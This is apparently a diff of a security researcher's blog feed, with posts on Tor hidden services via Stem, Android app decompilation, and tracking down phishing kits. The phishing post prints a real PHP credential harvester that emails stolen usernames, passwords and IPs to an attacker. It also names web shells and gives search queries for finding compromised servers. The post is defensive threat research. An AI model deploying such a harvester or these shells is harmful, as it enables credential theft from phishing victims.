-</pre></td><td class='code'><pre><code class=''><span class='line'>HiddenServiceDir /path/to/store/hidden_service/
-</span><span class='line'>HiddenServicePort 80 127.0.0.1:5000</span></code></pre></td></tr></table></div></figure>
-
-
-<h3>A Bit About the Tor Control Protocol</h3>
-
-<p>Changing the configuration file and restarting Tor everytime a change is needed can be a pain. Fortunately, Tor provides a way to dynamically change the running configuration using a simple text based protocol (similar to Telnet) called the Tor Control Protocol.</p>
-
-<p>The <a href="https://gitweb.torproject.org/torspec.git?a=blob_plain;hb=HEAD;f=control-spec.txt">full specification</a> of the protocol is available, however here is a quick example of getting the valid authentication methods:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet localhost 9151
-</span><span class='line'>PROTOCOLINFO
-</span><span class='line'>
-</span><span class='line'>250-PROTOCOLINFO 1
-</span><span class='line'>250-AUTH METHODS=COOKIE,SAFECOOKIE,HASHEDPASSWORD COOKIEFILE="Tor\\control_auth_cookie"
-</span><span class='line'>250-VERSION Tor="0.2.4.24"
-</span><span class='line'>250 OK</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Other examples using this extensive protocol can be found <a href="https://www.thesprawl.org/research/tor-control-protocol/">here</a> or in the full protocol spec.</p>
-
-<h3>Introducing Stem</h3>
-
-<p>To make interacting with the Tor control port both easier and programmatic, the Tor project maintains a fantastic Python library called <a href="https://stem.torproject.org/">Stem</a>.</p>
-
-<h4><code>stem.Controller</code></h4>
-
-<p>Interaction with the Tor control port is performed using the <code>stem.Controller</code> class. Creating an instance of the class involves connecting to the port and authenticating as follows:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>from stem.control import Controller
-</span><span class='line'>controller = Controller.from_port(address="127.0.0.1", port=9151)
-</span><span class='line'>try:
-</span><span class='line'>    controller.authenticate(password="")
-</span><span class='line'>except Exception as e:
-</span><span class='line'>    print e</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now that we have a Controller, we can access the local configuration, pull the current descriptors for relays, and more.</p>
-
-<p>Let&rsquo;s use the Controller to automatically set the configuration settings we saw in the previous section. When set, these configuration options will cause Tor to create the two files, <code>hostname</code> and <code>private_key</code>, necessary to run the hidden service. Here is a short script that will setup a hidden service to listen on TCP port 80 and proxy all requests to an (already established) web server listening on <a href="http://127.0.0.1:5000:">http://127.0.0.1:5000:</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>host = "127.0.0.1"
-</span><span class='line'>port = 5000
-</span><span class='line'>hidden_svc_dir = "/tmp/hidden_service/"
-</span><span class='line'>controller.set_options([
-</span><span class='line'>    ("HiddenServiceDir", hidden_svc_dir),
-</span><span class='line'>    ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
-</span><span class='line'>])
-</span><span class='line'>svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
-</span><span class='line'>print "Created host: %s" % svc_name</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Easy as that! Now that we have the configuration setup, our service should be ready to go.</p>
-
-<h3>An Example Service</h3>
-
-<p>Now that we&rsquo;ve seen a little about how Stem works, here&rsquo;s an extremely basic example showing how the hidden service can be setup to work with a Flask application:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>from stem.control import Controller
-</span><span class='line'>from flask import Flask
-</span><span class='line'>
-</span><span class='line'>if __name__ == "__main__":
-</span><span class='line'>
-</span><span class='line'>    app = Flask("example")
-</span><span class='line'>    port = 5000
-</span><span class='line'>    host = "127.0.0.1"
-</span><span class='line'>    hidden_svc_dir = "c:/temp/"
-</span><span class='line'>
-</span><span class='line'>    @app.route('/')
-</span><span class='line'>    def index():
-</span><span class='line'>        return "&lt;h1&gt;Tor works!&lt;/h1&gt;"
-</span><span class='line'>    print " * Getting controller"
-</span><span class='line'>    controller = Controller.from_port(address="127.0.0.1", port=9151)
-</span><span class='line'>    try:
-</span><span class='line'>        controller.authenticate(password="")
-</span><span class='line'>        controller.set_options([
-</span><span class='line'>            ("HiddenServiceDir", hidden_svc_dir),
-</span><span class='line'>            ("HiddenServicePort", "80 %s:%s" % (host, str(port)))
-</span><span class='line'>            ])
-</span><span class='line'>        svc_name = open(hidden_svc_dir + "/hostname", "r").read().strip()
-</span><span class='line'>        print " * Created host: %s" % svc_name
-</span><span class='line'>    except Exception as e:
-</span><span class='line'>        print e
-</span><span class='line'>    app.run()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here&rsquo;s what this looks like in action:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>C:\&gt;python tor_example.py
-</span><span class='line'> * Getting controller
-</span><span class='line'> * Created host: 4yrbax6gwnemqh7n.onion
-</span><span class='line'> * Running on http://127.0.0.1:5000/</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="http://jordan-wright.github.io/images/blog/hidden_services/screenshot.png"/></p>
-
-<h3>Caveats</h3>
-
-<p>It is important to note that the security of the hidden service depends on protecting the location of the server. To do this, consider ways to prevent leaking the real server IP through debug messages, etc. There has been some <a href="https://news.ycombinator.com/item?id=8404511">great discussion</a> on the topic that might be worth looking into.</p>
-
-<h3>Conclusion</h3>
-
-<p>Hidden services deliver freedom of speech and the free exchange of ideas without censorship. By using Stem Python library, it&rsquo;s possible to take the pain out of manual configuration and instead programmatically create and manage multiple hidden services.</p>
-
-<p>As always, let me know if you have any questions or comments.</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Decompiling Android Apps the Easy Way]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way/"/>
-    <updated>2014-08-10T19:51:00-05:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/08/10/decompiling-android-apps-the-easy-way</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/android_apps.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>Mobile applications are often viewed as black-box applications. However, these applications often suffer from the same (or similar) vulnerabilities as their web application counterparts.</p>
-
-<p>In a <a href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/">previous post</a>, I showed how we can perform dynamic analysis on iPhone applications by intercepting the inbound/outbound traffic with the Burp proxy. In this post, we&rsquo;ll explore static analysis of Android apps by looing at a couple of online tools that make decompiling apps into equivalent Java and Smali code trivial.</p>
-
-<!-- more -->
-
-
-<h3>Step One: Get the APK</h3>
-
-<p>The first step in analyzing an Android app is to get the actual APK that&rsquo;s loaded onto the device. Fortunately, there is a site called <a href="http://apps.evozi.com/apk-downloader/">APK Downloader</a> which allows us to do just that. By getting the link to the app of your choice from the <a href="https://play.google.com/store/apps?hl=en">Google Play Store</a> and pasting it into APK Downloader, you can download a local copy of the app APK.</p>
-
-<h3>Step Two: Unpack and Decompile</h3>
-
-<p>After we have the APK, we need to unpack and decompile the contents into its equivalent Java code. This used to be a pretty lengthy process using tools such as the <a href="https://code.google.com/p/android-apktool/">android apktool</a>. Fortunately for us, someone has also setup a web-based service which automatically performs the decompilation process on a given APK.</p>
-
-<p>By uploading the APK to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>, the user will be presented with the option to download the decompiled contents of the app, including the Java source code. <em>Awesome.</em></p>
-
-<h3>Things to Look For</h3>
-
-<p>Decompiling Android apps can allow researchers to analyze the exact code that is running on the app for vulnerabilities, as well as reveal any hardcoded credentials or other sensitive data. For example, in June of 2014, researchers from Columbia university created a tool called <a href="https://github.com/nviennot/playdrone">PlayDrone</a> which automatically crawled thousands of Android apps found on the Google Play store and <a href="http://www.cs.columbia.edu/~nieh/pubs/sigmetrics2014_playdrone.pdf">discovered the existence of sensitive credentials</a> in many of them.</p>
-
-<h3>Conclusion</h3>
-
-<p>Hopefully this short post not only shows researchers how to easily decompile Android apps, but also sends a gentle reminder to app developers that the source code of the app can easily be recovered. As such, precautions should be taken to ensure there is no sensitive information &ldquo;hidden in plain sight&rdquo;. As always, leave any questions or comments below!</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[How to Hunt Down Phishing Kits]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/"/>
-    <updated>2014-07-30T22:12:00-05:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/phishing_kit.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>Sites like <a href="http://www.phishtank.com/phish_archive.php">phishtank</a> and <a href="http://support.clean-mx.com/clean-mx/phishing.php">clean-mx</a> act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find <a href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/">interesting information</a> about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how <em>phishing kits</em> are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.</p>
-
-<!-- more -->
-
-
-<h3>How Phishing Kits Work</h3>
-
-<p>To perform a phishing attack, attackers commonly employ prebuilt <em>phishing kits</em>. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
-</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
-</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
-</span><span class='line'>        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location:file_doc.php&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="k">exit</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="nb">session_destroy</span><span class="p">();</span>
-</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
-</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$ip</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="nv">$country</span> <span class="o">=</span> <span class="nx">visitor_country</span><span class="p">();</span>
-</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;-------Moded by Ghost Wir3 ----------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Username: &quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Password : &quot;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;IP: &quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Country: &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$recipient</span> <span class="o">=</span> <span class="s2">&quot;[redacted]@gmail.com&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&quot;Ghost Wir3 - &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&quot;From:  Ghost Wir3 &lt;no_reply@mail.com&gt;&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eMailAdd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'><span class="nv">$arr</span> <span class="o">=</span> <span class="nx">country_sort</span><span class="p">();</span>
-</span><span class='line'><span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$recipient</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>        <span class="nb">mail</span><span class="p">(</span><span class="nv">$recipient</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message</span><span class="p">,</span><span class="nv">$headers</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In this example, to reuse the phishing kit, an attacker simply needs to change the <code>$recipient</code> variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).</p>
-
-<h3>How to Find Phishing Kits</h3>
-
-<p>We&rsquo;ve seen that these kits generally require the credentials to be processed by server-side code. Unless there is a misconfiguration on the server, we will not be able to view this code, only that credentials are being passed to it.</p>
-
-<p>However, with that being said, <em>many attackers are <strong>lazy</strong></em>. I&rsquo;ve seen from experience that the original zip file containing the phishing kit is often left on the server, and can be downloaded to reveal the server-side source code. Additionally, the directories hosting the phishing kits often have indexing enabled, making it easier for us to see the files in the directory. This same technique has also <a href="https://www.usenix.org/legacy/events/woot08/tech/full_papers/cova/cova.pdf">been used previously by researchers</a> with success.</p>
-
-<p><img src="http://jordan-wright.github.io/images/blog/phish_kits/directory_index.png"/></p>
-
-<p>Knowing this, we can send requests for common archive extensions automatically in the hopes of finding the original phishing kits. These extensions include things such as .zip, .tar, .tar.gz, and .rar. For example, if the URL found by phishtank or clean-mx is <a href="http://x.x.x.x/apple/index.php,">http://x.x.x.x/apple/index.php,</a> we could send requests for <a href="http://x.x.x.x/apple.zip">http://x.x.x.x/apple.zip</a> with success in many cases.</p>
-
-<p>In some cases, finding the original phishing kit can reveal even more information about the tools and techniques used by attackers. Here&rsquo;s an example of one of those cases.</p>
-
-<h3>A Look into a Compromised Website</h3>
-
-<p>While performing random checks on many of the sites listed on phishtank and clean-mx, I came across one site that had a phishing kit located in the /phpmyadmin directory. When checking the files in the phishing kit, I found reference to a c100.php web shell. Sure enough, this file was still in place on the server:</p>
-
-<p><img src="http://jordan-wright.github.io/images/blog/phish_kits/c100.png" /></p>
-
-<p>PHP backdoors provide substantial access to attackers, facilitating further attacks and control over the compromised server. The c100.php and c99.php backdoors are among the most popular backdoors used by attackers. Through some Googling, we can see that there are <strong>tons</strong> of servers that are compromised using <a href="https://www.google.com/search?q=inurl%3A%22c99.php%22%22AND+filetype%3Aphp+%22!C99Shell%22+AND+%22Software%22">these</a> <a href="https://www.google.com/search?q=inurl%3A%22c100.php%22%22AND+filetype%3Aphp+%22%21C100%22+AND+%22Software%22">shells</a>.</p>
-
-<p>This shell revealed additional scripts (and other webshells) used by the attacker, including (but certainly not limited to!) the following:</p>
-
-<ul>
-<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-valider-php">valider.php</a> &ndash; The credential caching script</li>
-<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wpbrute-php">wpbrute.php</a> &ndash; A Wordpress brute forcing script</li>
-<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wso-php">wso.php</a> &ndash; Another web shell</li>
-</ul>
-
-
-<h3>Fellow Phish Hunters</h3>
-
-<p>In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">428</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">432</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/update.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/us.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">443</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">446</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a <strong>substantial</strong> number of requests for common files to be found on phishing kits. I&rsquo;ll likely parse these out and make another blog post with the full list for those interested.</p>
-
-<h3>Conclusion</h3>
-
-<p>Hopefully this post not only shows a few of the interesting pieces of information we can find when investigating servers used for phishing campaigns, but also that there is still an incredible amount of work to be done in identifying threat actors behind phishing campaigns. As always, let me know if you have any questions or comments below!</p>
-
-<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[A Look at Comment Spam Generator Scripts]]></title>
-    <link href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/"/>
-    <updated>2014-04-04T14:33:00-05:00</updated>
-    <id>http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/spam_gen.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>It&rsquo;s been a while! I&rsquo;ve been busy getting <a href="http://github.com/jordan-wright/gophish">gophish</a> closer and closer to beta. Should be ready soon!</p>
-
-<p>Until then, here&rsquo;s a quick look at some comment spam scripts I discovered when perusing through the content over at <a href="http://phishtank.com">phishtank.com</a>.</p>
-
